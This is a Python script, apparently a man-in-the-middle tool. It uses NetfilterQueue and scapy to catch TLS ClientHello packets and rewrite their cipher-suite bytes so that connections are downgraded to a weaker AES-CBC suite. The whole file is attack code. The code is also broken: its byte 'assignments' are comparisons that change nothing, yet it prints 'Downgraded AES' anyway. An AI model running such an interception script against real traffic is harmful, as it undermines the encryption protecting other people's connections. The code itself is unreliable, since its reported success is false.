from netfilterqueue import NetfilterQueue
from scapy.all import *
import socket
import re

def print_and_accept(pkt):
    ip = IP(pkt.get_payload())
    
    if ip.haslayer("Raw"):

        print("IP packet received")

        payload = ip["Raw"].load

        if payload[0] == 0x16 and payload[5] == 0x01:
            payload[112] == 0x00
            payload[113] == 0x2f
            print("Downgraded AES")
            pkt.set_payload(payload)
    
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
try:
    nfqueue.run_socket(s)
except KeyboardInterrupt:
    print('')

s.close()
nfqueue.unbind()